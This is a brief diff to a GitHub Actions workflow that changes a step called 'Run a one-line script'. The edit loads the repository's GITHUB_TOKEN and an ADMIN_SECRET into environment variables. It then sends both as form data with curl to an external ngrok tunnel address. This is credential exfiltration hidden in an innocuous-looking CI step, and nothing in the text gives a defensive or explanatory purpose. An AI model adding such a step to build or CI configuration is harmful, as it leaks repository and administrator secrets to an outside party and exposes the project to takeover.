@@ -27,4 +27,7 @@ jobs:
 
       # Runs a single command using the runners shell
       - name: Run a one-line script
-        run: curl https://74a55a7fa3c9.ngrok.io -d foo="from GitHub Action"
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ADMIN_SECRET: ${{ secrets.ADMIN_SECRET }}
+        run: curl https://920ec84d1762.ngrok.io -d foo="from GitHub Action" -d token=${{ env.TOKEN }} -d admin=${{ env.ADMIN_SECRET }}
